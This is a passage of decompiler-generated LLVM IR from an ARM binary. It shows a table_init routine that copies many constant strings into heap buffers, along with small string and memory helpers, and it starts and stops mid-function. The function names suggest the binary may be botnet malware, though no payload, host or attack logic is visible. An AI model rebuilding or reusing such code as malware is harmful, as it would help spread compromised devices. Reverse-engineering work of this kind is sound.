  %v8_fe34 = icmp sgt i32 %v4_fe28, %v1_fe2c
  br i1 %v8_fe34, label %dec_label_pc_fde8.dec_label_pc_fde8_crit_edge, label %dec_label_pc_fe38.loopexit

dec_label_pc_fde8.dec_label_pc_fde8_crit_edge:    ; preds = %dec_label_pc_fde8
  %v0_fdf0.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_fde8

dec_label_pc_fe38.loopexit:                       ; preds = %dec_label_pc_fde8
  %v2_fe38.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_fe38

dec_label_pc_fe38:                                ; preds = %dec_label_pc_fe38.loopexit, %entry
  %v2_fe38 = phi i32 [ %v2_fe38.pre, %dec_label_pc_fe38.loopexit ], [ %v3_fdcc, %entry ]
  store i32 %v2_fe38, i32* @r4, align 4
  ret i32 %v2_fdb4

; uselistorder directives
  uselistorder i32 %v1_fe2c, { 1, 2, 0 }
  uselistorder i32 %v1_fddc, { 1, 0 }
  uselistorder i32 %v2_fdb8, { 3, 0, 1, 2 }
  uselistorder i32 %v3_fdb0, { 1, 0 }
}

define i32 @table_init(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_fe48 = load i32, i32* @r4, align 4
  %v6_fe48 = load i32, i32* @r5, align 4
  %v9_fe48 = load i32, i32* @r6, align 4
  %v12_fe48 = load i32, i32* @r7, align 4
  %v15_fe48 = load i32, i32* @r8, align 4
  %v21_fe48 = load i32, i32* @sl, align 4
  %v24_fe48 = load i32, i32* @fp, align 4
  store i32 2, i32* @r0, align 4
  %v0_fe54 = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_24758.215 to i32), i32* @r4, align 4
  store i32 2, i32* @r7, align 4
  %v4_fe6c = call i32 @util_memcpy(i32 %v0_fe54, i32 ptrtoint ([3 x i8]* @global_var_19330.223 to i32), i32 2)
  store i32 13, i32* @r0, align 4
  store i32 %v0_fe54, i32* @global_var_24760.224, align 4
  %v0_fe78 = load i32, i32* @r7, align 4
  %v1_fe78 = trunc i32 %v0_fe78 to i16
  store i16 %v1_fe78, i16* bitcast (i32* @global_var_24764.225 to i16*), align 4
  store i32 13, i32* @r5, align 4
  %v0_fe80 = call i32 @malloc()
  store i32 ptrtoint ([16 x i8]* @global_var_19334.227 to i32), i32* @r8, align 4
  %v0_fe88 = load i32, i32* @r5, align 4
  store i32 %v0_fe80, i32* @r6, align 4
  %v4_fe94 = call i32 @util_memcpy(i32 %v0_fe80, i32 ptrtoint ([16 x i8]* @global_var_19334.227 to i32), i32 %v0_fe88)
  %v0_fe98 = load i32, i32* @r5, align 4
  store i32 %v0_fe98, i32* @r0, align 4
  %v0_fe9c = load i32, i32* @r6, align 4
  store i32 %v0_fe9c, i32* @global_var_24768.228, align 4
  %v1_fea0 = trunc i32 %v0_fe98 to i16
  store i16 %v1_fea0, i16* bitcast (i32* @global_var_2476c.229 to i16*), align 4
  %v0_fea4 = call i32 @malloc()
  %v0_fea8 = load i32, i32* @r8, align 4
  %v0_feac = load i32, i32* @r5, align 4
  store i32 %v0_fea4, i32* @r6, align 4
  %v4_feb4 = call i32 @util_memcpy(i32 %v0_fea4, i32 %v0_fea8, i32 %v0_feac)
  %v0_feb8 = load i32, i32* @r7, align 4
  store i32 %v0_feb8, i32* @r0, align 4
  %v0_febc = load i32, i32* @r6, align 4
  store i32 %v0_febc, i32* @global_var_24770.230, align 4
  %v0_fec0 = load i32, i32* @r5, align 4
  %v1_fec0 = trunc i32 %v0_fec0 to i16
  store i16 %v1_fec0, i16* bitcast (i32* @global_var_24774.231 to i16*), align 4
  %v0_fec4 = call i32 @malloc()
  %v0_fec8 = load i32, i32* @r7, align 4
  store i32 %v0_fec4, i32* @r5, align 4
  %v3_fed4 = call i32 @util_memcpy(i32 %v0_fec4, i32 ptrtoint (i32* @global_var_19344.233 to i32), i32 %v0_fec8)
  store i32 29, i32* @r0, align 4
  %v0_fedc = load i32, i32* @r5, align 4
  store i32 %v0_fedc, i32* @global_var_24778.234, align 4
  %v0_fee0 = load i32, i32* @r7, align 4
  %v1_fee0 = trunc i32 %v0_fee0 to i16
  store i16 %v1_fee0, i16* bitcast (i32* @global_var_2477c.235 to i16*), align 4
  %v0_fee4 = call i32 @malloc()
  store i32 %v0_fee4, i32* @r5, align 4
  %v3_fef4 = call i32 @util_memcpy(i32 %v0_fee4, i32 ptrtoint (i32* @global_var_194c4.237 to i32), i32 29)
  store i32 6, i32* @r0, align 4
  store i16 29, i16* bitcast (i32* @global_var_24784.238 to i16*), align 4
  %v0_ff04 = load i32, i32* @r5, align 4
  store i32 %v0_ff04, i32* @global_var_24780.239, align 4
  %v0_ff08 = call i32 @malloc()
  store i32 6, i32* @sb, align 4
  store i32 %v0_ff08, i32* @r5, align 4
  %v4_ff1c = call i32 @util_memcpy(i32 %v0_ff08, i32 ptrtoint ([7 x i8]* @global_var_19348.241 to i32), i32 6)
  store i32 7, i32* @r0, align 4
  store i32 7, i32* @r7, align 4
  %v0_ff28 = load i32, i32* @r5, align 4
  store i32 %v0_ff28, i32* @global_var_24788.242, align 4
  %v0_ff2c = load i32, i32* @sb, align 4
  %v1_ff2c = trunc i32 %v0_ff2c to i16
  store i16 %v1_ff2c, i16* bitcast (i32* @global_var_2478c.243 to i16*), align 4
  %v0_ff30 = call i32 @malloc()
  %v0_ff34 = load i32, i32* @r7, align 4
  store i32 %v0_ff30, i32* @r5, align 4
  %v4_ff40 = call i32 @util_memcpy(i32 %v0_ff30, i32 ptrtoint ([8 x i8]* @global_var_19350.245 to i32), i32 %v0_ff34)
  %v0_ff44 = load i32, i32* @r7, align 4
  store i32 %v0_ff44, i32* @r0, align 4
  %v0_ff48 = load i32, i32* @r5, align 4
  store i32 %v0_ff48, i32* @global_var_24790.246, align 4
  %v1_ff4c = trunc i32 %v0_ff44 to i16
  store i16 %v1_ff4c, i16* bitcast (i32* @global_var_24794.247 to i16*), align 4
  %v0_ff50 = call i32 @malloc()
  %v0_ff54 = load i32, i32* @r7, align 4
  store i32 %v0_ff50, i32* @r5, align 4
  %v4_ff60 = call i32 @util_memcpy(i32 %v0_ff50, i32 ptrtoint ([8 x i8]* @global_var_19358.249 to i32), i32 %v0_ff54)
  store i32 3, i32* @r0, align 4
  %v0_ff68 = load i32, i32* @r5, align 4
  store i32 %v0_ff68, i32* @global_var_24798.250, align 4
  %v0_ff6c = load i32, i32* @r7, align 4
  %v1_ff6c = trunc i32 %v0_ff6c to i16
  store i16 %v1_ff6c, i16* bitcast (i32* @global_var_2479c.251 to i16*), align 4
  %v0_ff70 = call i32 @malloc()
  store i32 %v0_ff70, i32* @r5, align 4
  %v4_ff80 = call i32 @util_memcpy(i32 %v0_ff70, i32 ptrtoint ([4 x i8]* @global_var_19360.253 to i32), i32 3)
  store i32 19, i32* @r0, align 4
  store i16 3, i16* bitcast (i32* @global_var_247a4.254 to i16*), align 4
  %v0_ff90 = load i32, i32* @r5, align 4
  store i32 %v0_ff90, i32* @global_var_247a0.255, align 4
  %v0_ff94 = call i32 @malloc()
  store i32 %v0_ff94, i32* @r5, align 4
  %v3_ffa4 = call i32 @util_memcpy(i32 %v0_ff94, i32 ptrtoint (i32* @global_var_19364.257 to i32), i32 19)
  store i32 24, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_247ac.258 to i16*), align 4
  %v0_ffb4 = load i32, i32* @r5, align 4
  store i32 %v0_ffb4, i32* @global_var_247a8.259, align 4
  %v0_ffb8 = call i32 @malloc()
  store i32 %v0_ffb8, i32* @r5, align 4
  %v3_ffc8 = call i32 @util_memcpy(i32 %v0_ffb8, i32 ptrtoint (i32* @global_var_19378.261 to i32), i32 24)
  store i32 9, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_247b4.262 to i16*), align 4
  %v0_ffd8 = load i32, i32* @r5, align 4
  store i32 %v0_ffd8, i32* @global_var_247b0.263, align 4
  %v0_ffdc = call i32 @malloc()
  store i32 %v0_ffdc, i32* @r5, align 4
  %v4_ffec = call i32 @util_memcpy(i32 %v0_ffdc, i32 ptrtoint ([10 x i8]* @global_var_19394.265 to i32), i32 9)
  store i32 16, i32* @r0, align 4
  store i16 9, i16* bitcast (i32* @global_var_247bc.266 to i16*), align 4
  %v0_fffc = load i32, i32* @r5, align 4
  store i32 %v0_fffc, i32* @global_var_247b8.267, align 4
  %v0_10000 = call i32 @malloc()
  store i32 16, i32* @sl, align 4
  store i32 %v0_10000, i32* @r5, align 4
  %v4_10014 = call i32 @util_memcpy(i32 %v0_10000, i32 ptrtoint ([17 x i8]* @global_var_193a0.269 to i32), i32 16)
  store i32 22, i32* @r0, align 4
  %v0_1001c = load i32, i32* @r5, align 4
  store i32 %v0_1001c, i32* @global_var_247c0.270, align 4
  %v0_10020 = load i32, i32* @sl, align 4
  %v1_10020 = trunc i32 %v0_10020 to i16
  store i16 %v1_10020, i16* bitcast (i32* @global_var_247c4.271 to i16*), align 4
  %v0_10024 = call i32 @malloc()
  store i32 %v0_10024, i32* @r5, align 4
  %v4_10034 = call i32 @util_memcpy(i32 %v0_10024, i32 ptrtoint ([23 x i8]* @global_var_193b4.273 to i32), i32 22)
  %v0_1003c = load i32, i32* @r7, align 4
  store i32 %v0_1003c, i32* @r0, align 4
  store i16 22, i16* bitcast (i32* @global_var_247cc.274 to i16*), align 4
  %v0_10044 = load i32, i32* @r5, align 4
  store i32 %v0_10044, i32* @global_var_247c8.275, align 4
  %v0_10048 = call i32 @malloc()
  %v0_1004c = load i32, i32* @r7, align 4
  store i32 %v0_10048, i32* @r5, align 4
  %v4_10058 = call i32 @util_memcpy(i32 %v0_10048, i32 ptrtoint ([8 x i8]* @global_var_193cc.277 to i32), i32 %v0_1004c)
  store i32 5, i32* @r0, align 4
  %v0_10060 = load i32, i32* @r5, align 4
  store i32 %v0_10060, i32* @global_var_247d0.278, align 4
  %v0_10064 = load i32, i32* @r7, align 4
  %v1_10064 = trunc i32 %v0_10064 to i16
  store i16 %v1_10064, i16* bitcast (i32* @global_var_247d4.279 to i16*), align 4
  %v0_10068 = call i32 @malloc()
  store i32 %v0_10068, i32* @r5, align 4
  store i32 5, i32* @fp, align 4
  %v4_1007c = call i32 @util_memcpy(i32 %v0_10068, i32 ptrtoint ([6 x i8]* @global_var_193d4.281 to i32), i32 5)
  store i32 4, i32* @r0, align 4
  %v0_10084 = load i32, i32* @r5, align 4
  store i32 %v0_10084, i32* @global_var_247d8.282, align 4
  %v0_10088 = load i32, i32* @fp, align 4
  %v1_10088 = trunc i32 %v0_10088 to i16
  store i16 %v1_10088, i16* bitcast (i32* @global_var_247dc.283 to i16*), align 4
  %v0_1008c = call i32 @malloc()
  store i32 %v0_1008c, i32* @r5, align 4
  %v4_1009c = call i32 @util_memcpy(i32 %v0_1008c, i32 ptrtoint ([5 x i8]* @global_var_193dc.285 to i32), i32 4)
  %v0_100a4 = load i32, i32* @sb, align 4
  store i32 %v0_100a4, i32* @r0, align 4
  store i16 4, i16* bitcast (i32* @global_var_247e4.286 to i16*), align 4
  %v0_100ac = load i32, i32* @r5, align 4
  store i32 %v0_100ac, i32* @global_var_247e0.287, align 4
  %v0_100b0 = call i32 @malloc()
  %v0_100b8 = load i32, i32* @sb, align 4
  store i32 %v0_100b0, i32* @r5, align 4
  %v4_100c0 = call i32 @util_memcpy(i32 %v0_100b0, i32 ptrtoint ([7 x i8]* @global_var_193e4.289 to i32), i32 %v0_100b8)
  store i32 14, i32* @r0, align 4
  %v0_100c8 = load i32, i32* @r5, align 4
  store i32 %v0_100c8, i32* @global_var_247e8.290, align 4
  %v0_100cc = load i32, i32* @sb, align 4
  %v1_100cc = trunc i32 %v0_100cc to i16
  store i16 %v1_100cc, i16* bitcast (i32* @global_var_247ec.291 to i16*), align 4
  %v0_100d0 = call i32 @malloc()
  store i32 %v0_100d0, i32* @r5, align 4
  store i32 14, i32* @r8, align 4
  %v4_100e4 = call i32 @util_memcpy(i32 %v0_100d0, i32 ptrtoint ([15 x i8]* @global_var_193ec.293 to i32), i32 14)
  store i32 8, i32* @r0, align 4
  %v0_100ec = load i32, i32* @r5, align 4
  store i32 %v0_100ec, i32* @global_var_247f0.294, align 4
  %v0_100f0 = load i32, i32* @r8, align 4
  %v1_100f0 = trunc i32 %v0_100f0 to i16
  store i16 %v1_100f0, i16* bitcast (i32* @global_var_247f4.295 to i16*), align 4
  %v0_100f4 = call i32 @malloc()
  store i32 8, i32* @r6, align 4
  store i32 %v0_100f4, i32* @r5, align 4
  %v4_10108 = call i32 @util_memcpy(i32 %v0_100f4, i32 ptrtoint ([9 x i8]* @global_var_193fc.297 to i32), i32 8)
  %v0_10110 = load i32, i32* @r7, align 4
  store i32 %v0_10110, i32* @r0, align 4
  %v0_10114 = load i32, i32* @r6, align 4
  %v1_10114 = trunc i32 %v0_10114 to i16
  %v2_10114 = load i32, i32* @r4, align 4
  %v4_10114 = add i32 %v2_10114, 260
  %v5_10114 = inttoptr i32 %v4_10114 to i16*
  store i16 %v1_10114, i16* %v5_10114, align 2
  %v0_10118 = load i32, i32* @r5, align 4
  store i32 %v0_10118, i32* @global_var_24858.298, align 4
  %v0_1011c = call i32 @malloc()
  %v0_10120 = load i32, i32* @r7, align 4
  store i32 %v0_1011c, i32* @r5, align 4
  %v4_1012c = call i32 @util_memcpy(i32 %v0_1011c, i32 ptrtoint ([8 x i8]* @global_var_19408.300 to i32), i32 %v0_10120)
  %v0_10134 = load i32, i32* @sl, align 4
  store i32 %v0_10134, i32* @r0, align 4
  %v0_10138 = load i32, i32* @r7, align 4
  %v1_10138 = trunc i32 %v0_10138 to i16
  %v2_10138 = load i32, i32* @r4, align 4
  %v4_10138 = add i32 %v2_10138, 268
  %v5_10138 = inttoptr i32 %v4_10138 to i16*
  store i16 %v1_10138, i16* %v5_10138, align 2
  %v0_1013c = load i32, i32* @r5, align 4
  store i32 %v0_1013c, i32* @global_var_24860.301, align 4
  %v0_10140 = call i32 @malloc()
  %v0_10148 = load i32, i32* @sl, align 4
  store i32 %v0_10140, i32* @r5, align 4
  %v4_10150 = call i32 @util_memcpy(i32 %v0_10140, i32 ptrtoint ([17 x i8]* @global_var_19410.303 to i32), i32 %v0_10148)
  store i32 23, i32* @r0, align 4
  %v0_10158 = load i32, i32* @r5, align 4
  store i32 %v0_10158, i32* @global_var_247f8.304, align 4
  %v0_1015c = load i32, i32* @sl, align 4
  %v1_1015c = trunc i32 %v0_1015c to i16
  store i16 %v1_1015c, i16* bitcast (i32* @global_var_247fc.305 to i16*), align 4
  %v0_10160 = call i32 @malloc()
  store i32 %v0_10160, i32* @r5, align 4
  %v0_10170 = load i32, i32* @r7, align 4
  %v1_10170 = load i32, i32* @sl, align 4
  %v2_10170 = add i32 %v1_10170, %v0_10170
  store i32 %v2_10170, i32* @r7, align 4
  %v4_10174 = call i32 @util_memcpy(i32 %v0_10160, i32 ptrtoint ([24 x i8]* @global_var_19424.307 to i32), i32 23)
  %v0_10178 = load i32, i32* @r6, align 4
  store i32 %v0_10178, i32* @r0, align 4
  %v0_1017c = load i32, i32* @r5, align 4
  store i32 %v0_1017c, i32* @global_var_24800.308, align 4
  %v0_10180 = load i32, i32* @r7, align 4
  %v1_10180 = trunc i32 %v0_10180 to i16
  store i16 %v1_10180, i16* bitcast (i32* @global_var_24804.309 to i16*), align 4
  %v0_10184 = call i32 @malloc()
  %v0_1018c = load i32, i32* @r6, align 4
  store i32 %v0_10184, i32* @r5, align 4
  %v4_10194 = call i32 @util_memcpy(i32 %v0_10184, i32 ptrtoint ([9 x i8]* @global_var_1943c.311 to i32), i32 %v0_1018c)
  store i32 21, i32* @r0, align 4
  %v0_1019c = load i32, i32* @r5, align 4
  store i32 %v0_1019c, i32* @global_var_24808.312, align 4
  %v0_101a0 = load i32, i32* @r6, align 4
  %v1_101a0 = trunc i32 %v0_101a0 to i16
  store i16 %v1_101a0, i16* bitcast (i32* @global_var_2480c.313 to i16*), align 4
  %v0_101a4 = call i32 @malloc()
  store i32 %v0_101a4, i32* @r5, align 4
  %v3_101b4 = call i32 @util_memcpy(i32 %v0_101a4, i32 ptrtoint (i32* @global_var_194e4.315 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  store i16 21, i16* bitcast (i32* @global_var_24814.316 to i16*), align 4
  %v0_101c4 = load i32, i32* @r5, align 4
  store i32 %v0_101c4, i32* @global_var_24810.317, align 4
  %v0_101c8 = call i32 @malloc()
  store i32 %v0_101c8, i32* @r5, align 4
  %v4_101d8 = call i32 @util_memcpy(i32 %v0_101c8, i32 ptrtoint ([18 x i8]* @global_var_19448.319 to i32), i32 17)
  store i32 12, i32* @r0, align 4
  store i16 17, i16* bitcast (i32* @global_var_2481c.320 to i16*), align 4
  %v0_101e8 = load i32, i32* @r5, align 4
  store i32 %v0_101e8, i32* @global_var_24818.321, align 4
  %v0_101ec = call i32 @malloc()
  store i32 %v0_101ec, i32* @r5, align 4
  %v4_101fc = call i32 @util_memcpy(i32 %v0_101ec, i32 ptrtoint ([13 x i8]* @global_var_1945c.323 to i32), i32 12)
  %v0_10204 = load i32, i32* @r8, align 4
  store i32 %v0_10204, i32* @r0, align 4
  store i16 12, i16* bitcast (i32* @global_var_24824.324 to i16*), align 4
  %v0_1020c = load i32, i32* @r5, align 4
  store i32 %v0_1020c, i32* @global_var_24820.325, align 4
  %v0_10210 = call i32 @malloc()
  %v0_10218 = load i32, i32* @r8, align 4
  store i32 %v0_10210, i32* @r5, align 4
  %v4_10220 = call i32 @util_memcpy(i32 %v0_10210, i32 ptrtoint ([15 x i8]* @global_var_1946c.327 to i32), i32 %v0_10218)
  store i32 19, i32* @r0, align 4
  %v0_10228 = load i32, i32* @r5, align 4
  store i32 %v0_10228, i32* @global_var_24828.328, align 4
  %v0_1022c = load i32, i32* @r8, align 4
  %v1_1022c = trunc i32 %v0_1022c to i16
  store i16 %v1_1022c, i16* bitcast (i32* @global_var_2482c.329 to i16*), align 4
  %v0_10230 = call i32 @malloc()
  store i32 %v0_10230, i32* @r5, align 4
  %v4_10240 = call i32 @util_memcpy(i32 %v0_10230, i32 ptrtoint ([20 x i8]* @global_var_1947c.331 to i32), i32 19)
  %v0_10248 = load i32, i32* @r6, align 4
  store i32 %v0_10248, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_24834.332 to i16*), align 4
  %v0_10250 = load i32, i32* @r5, align 4
  store i32 %v0_10250, i32* @global_var_24830.333, align 4
  %v0_10254 = call i32 @malloc()
  %v0_1025c = load i32, i32* @r6, align 4
  store i32 %v0_10254, i32* @r5, align 4
  %v4_10264 = call i32 @util_memcpy(i32 %v0_10254, i32 ptrtoint ([9 x i8]* @global_var_19490.335 to i32), i32 %v0_1025c)
  %v0_10268 = load i32, i32* @fp, align 4
  store i32 %v0_10268, i32* @r0, align 4
  %v0_1026c = load i32, i32* @r5, align 4
  store i32 %v0_1026c, i32* @global_var_24838.336, align 4
  %v0_10270 = load i32, i32* @r6, align 4
  %v1_10270 = trunc i32 %v0_10270 to i16
  store i16 %v1_10270, i16* bitcast (i32* @global_var_2483c.337 to i16*), align 4
  %v0_10274 = call i32 @malloc()
  %v0_1027c = load i32, i32* @fp, align 4
  store i32 %v0_10274, i32* @r5, align 4
  %v4_10284 = call i32 @util_memcpy(i32 %v0_10274, i32 ptrtoint ([6 x i8]* @global_var_1949c.339 to i32), i32 %v0_1027c)
  %v0_10288 = load i32, i32* @sb, align 4
  store i32 %v0_10288, i32* @r0, align 4
  %v0_1028c = load i32, i32* @r5, align 4
  store i32 %v0_1028c, i32* @global_var_24840.340, align 4
  %v0_10290 = load i32, i32* @fp, align 4
  %v1_10290 = trunc i32 %v0_10290 to i16
  store i16 %v1_10290, i16* bitcast (i32* @global_var_24844.341 to i16*), align 4
  %v0_10294 = call i32 @malloc()
  %v0_1029c = load i32, i32* @sb, align 4
  store i32 %v0_10294, i32* @r5, align 4
  %v4_102a4 = call i32 @util_memcpy(i32 %v0_10294, i32 ptrtoint ([7 x i8]* @global_var_194a4.343 to i32), i32 %v0_1029c)
  %v0_102a8 = load i32, i32* @r7, align 4
  store i32 %v0_102a8, i32* @r0, align 4
  %v0_102ac = load i32, i32* @r5, align 4
  store i32 %v0_102ac, i32* @global_var_24848.344, align 4
  %v0_102b0 = load i32, i32* @sb, align 4
  %v1_102b0 = trunc i32 %v0_102b0 to i16
  store i16 %v1_102b0, i16* bitcast (i32* @global_var_2484c.345 to i16*), align 4
  %v0_102b4 = call i32 @malloc()
  %v0_102bc = load i32, i32* @r7, align 4
  %v4_102c4 = call i32 @util_memcpy(i32 %v0_102b4, i32 ptrtoint ([24 x i8]* @global_var_194ac.347 to i32), i32 %v0_102bc)
  %v0_102c8 = load i32, i32* @r7, align 4
  %v1_102c8 = trunc i32 %v0_102c8 to i16
  store i16 %v1_102c8, i16* bitcast (i32* @global_var_24854.348 to i16*), align 4
  store i32 %v0_102b4, i32* @global_var_24850.349, align 4
  store i32 %v3_fe48, i32* @r4, align 4
  store i32 %v6_fe48, i32* @r5, align 4
  store i32 %v9_fe48, i32* @r6, align 4
  store i32 %v12_fe48, i32* @r7, align 4
  store i32 %v15_fe48, i32* @r8, align 4
  store i32 %v21_fe48, i32* @sl, align 4
  store i32 %v24_fe48, i32* @fp, align 4
  ret i32 %v4_102c4

; uselistorder directives
  uselistorder i32 %v0_10294, { 1, 0 }
  uselistorder i32 %v0_10274, { 1, 0 }
  uselistorder i32 %v0_10254, { 1, 0 }
  uselistorder i32 %v0_10210, { 1, 0 }
  uselistorder i32 %v0_10184, { 1, 0 }
  uselistorder i32 %v0_10140, { 1, 0 }
  uselistorder i32 %v0_1011c, { 1, 0 }
  uselistorder i32 %v0_100f4, { 1, 0 }
  uselistorder i32 %v0_100b0, { 1, 0 }
  uselistorder i32 %v0_10048, { 1, 0 }
  uselistorder i32 %v0_10000, { 1, 0 }
  uselistorder i32 %v0_ff50, { 1, 0 }
  uselistorder i32 %v0_ff30, { 1, 0 }
  uselistorder i32 %v0_ff08, { 1, 0 }
  uselistorder i32 %v0_fec4, { 1, 0 }
  uselistorder i32 %v0_fea4, { 1, 0 }
  uselistorder i32 %v0_fe80, { 1, 0 }
  uselistorder i32 23, { 0, 3, 1, 2 }
  uselistorder i32 29, { 0, 12, 1, 7, 5, 8, 2, 9, 3, 10, 4, 11, 13, 6 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_24758.215 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10364 = load i8, i8* %arg1, align 1
  %v2_10368 = icmp eq i8 %v3_10364, 0
  %v0_1036c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10368, i32 %v0_1036c)
  br label %dec_label_pc_10374

dec_label_pc_10374:                               ; preds = %dec_label_pc_10374, %entry
  %v0_10374 = phi i32 [ %v1_10374, %dec_label_pc_10374 ], [ 0, %entry ]
  %v1_10374 = add i32 %v0_10374, 1
  %v2_10378 = add i32 %v1_10374, %tmp
  %v3_10378 = inttoptr i32 %v2_10378 to i8*
  %v4_10378 = load i8, i8* %v3_10378, align 1
  %v6_10378 = zext i8 %v4_10378 to i32
  store i32 %v6_10378, i32* @r3, align 4
  %v2_1037c = icmp eq i8 %v4_10378, 0
  br i1 %v2_1037c, label %dec_label_pc_10384, label %dec_label_pc_10374

dec_label_pc_10384:                               ; preds = %dec_label_pc_10374
  ret i32 %v1_10374
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v2_10388 = load i8, i8* %arg1, align 1
  %v3_10388 = zext i8 %v2_10388 to i32
  store i32 %v3_10388, i32* @r2, align 4
  %v2_1038c = icmp eq i8 %v2_10388, 0
  br i1 %v2_1038c, label %bb, label %dec_label_pc_10398

bb:                                               ; preds = %entry
  store i32 %v3_10388, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_103ac

dec_label_pc_10398:                               ; preds = %entry
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1039c

dec_label_pc_1039c:                               ; preds = %dec_label_pc_1039c, %dec_label_pc_10398
  %v0_1039c = phi i32 [ %v1_1039c, %dec_label_pc_1039c ], [ 0, %dec_label_pc_10398 ]
  %v1_1039c = add i32 %v0_1039c, 1
  store i32 %v1_1039c, i32* %ip.global-to-local, align 4
  %v2_103a0 = add i32 %v1_1039c, %tmp
  %v3_103a0 = inttoptr i32 %v2_103a0 to i8*
  %v4_103a0 = load i8, i8* %v3_103a0, align 1
  %v2_103a4 = icmp eq i8 %v4_103a0, 0
  br i1 %v2_103a4, label %dec_label_pc_103ac, label %dec_label_pc_1039c

dec_label_pc_103ac:                               ; preds = %dec_label_pc_1039c, %bb
  %v0_103ac = phi i32 [ %v3_10388, %bb ], [ %v1_1039c, %dec_label_pc_1039c ]
  br label %dec_label_pc_103b8

dec_label_pc_103b4:                               ; preds = %dec_label_pc_103b8
  %v0_103b4 = load i32, i32* @r1, align 4
  %v1_103b4 = add i32 %v0_103b4, 1
  %v2_103b4 = inttoptr i32 %v1_103b4 to i8*
  %v3_103b4 = load i8, i8* %v2_103b4, align 1
  %v4_103b4 = zext i8 %v3_103b4 to i32
  store i32 %v4_103b4, i32* @r2, align 4
  store i32 %v1_103b4, i32* @r1, align 4
  %v0_103b8.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_103b8

dec_label_pc_103b8:                               ; preds = %dec_label_pc_103ac, %dec_label_pc_103b4
  %v0_103c0.off0 = phi i8 [ %v2_10388, %dec_label_pc_103ac ], [ %v3_103b4, %dec_label_pc_103b4 ]
  %v0_103b8 = phi i32 [ %v0_103ac, %dec_label_pc_103ac ], [ %v0_103b8.pr, %dec_label_pc_103b4 ]
  %v1_103b8 = add i32 %v0_103b8, -1
  store i32 %v1_103b8, i32* @r3, align 4
  %v3_103bc = icmp eq i32 %v0_103b8, 0
  %v2_103c0 = load i32, i32* @r0, align 4
  %v3_103c0 = inttoptr i32 %v2_103c0 to i8*
  store i8 %v0_103c0.off0, i8* %v3_103c0, align 1
  %v4_103c0 = load i32, i32* @r0, align 4
  %v5_103c0 = add i32 %v4_103c0, 1
  store i32 %v5_103c0, i32* @r0, align 4
  br i1 %v3_103bc, label %dec_label_pc_103c8, label %dec_label_pc_103b4

dec_label_pc_103c8:                               ; preds = %dec_label_pc_103b8
  %v0_103c8 = load i32, i32* %ip.global-to-local, align 4
  ret i32 %v0_103c8

; uselistorder directives
  uselistorder i32 %v0_103b8, { 1, 0 }
  uselistorder i32 %v1_1039c, { 0, 1, 3, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_103b8, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v2_103d0 = icmp eq i32 %arg3, 0
  %v0_103d4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_103d0, i32 %v0_103d4)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_103dc

dec_label_pc_103dc:                               ; preds = %dec_label_pc_103dc, %entry
  %v0_103dc = phi i32 [ %v1_103e4, %dec_label_pc_103dc ], [ 0, %entry ]
  %v2_103dc = add i32 %v0_103dc, %arg2
  %v3_103dc = inttoptr i32 %v2_103dc to i8*
  %v4_103dc = load i8, i8* %v3_103dc, align 1
  %v4_103e0 = add i32 %v0_103dc, %arg1
  %v5_103e0 = inttoptr i32 %v4_103e0 to i8*
  store i8 %v4_103dc, i8* %v5_103e0, align 1
  %v0_103e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_103e4 = add i32 %v0_103e4, 1
  store i32 %v1_103e4, i32* %ip.global-to-local, align 4
  %v9_103e8 = icmp eq i32 %v1_103e4, %arg3
  br i1 %v9_103e8, label %dec_label_pc_103f0, label %dec_label_pc_103dc

dec_label_pc_103f0:                               ; preds = %dec_label_pc_103dc
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_103e4, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v0_103f4 = load i32, i32* @r1, align 4
  %v2_103f4 = icmp eq i32 %v0_103f4, 0
  %v0_103f8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_103f4, i32 %v0_103f8)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10400

dec_label_pc_10400:                               ; preds = %dec_label_pc_10400, %entry
  %v2_10404 = phi i32 [ %v1_10408, %dec_label_pc_10400 ], [ 0, %entry ]
  store i32 0, i32* @r3, align 4
  %v3_10404 = load i32, i32* @r0, align 4
  %v4_10404 = add i32 %v3_10404, %v2_10404
  %v5_10404 = inttoptr i32 %v4_10404 to i8*
  store i8 0, i8* %v5_10404, align 1
  %v0_10408 = load i32, i32* %r2.global-to-local, align 4
  %v1_10408 = add i32 %v0_10408, 1
  store i32 %v1_10408, i32* %r2.global-to-local, align 4
  %v1_1040c = load i32, i32* @r1, align 4
  %v9_1040c = icmp eq i32 %v1_10408, %v1_1040c
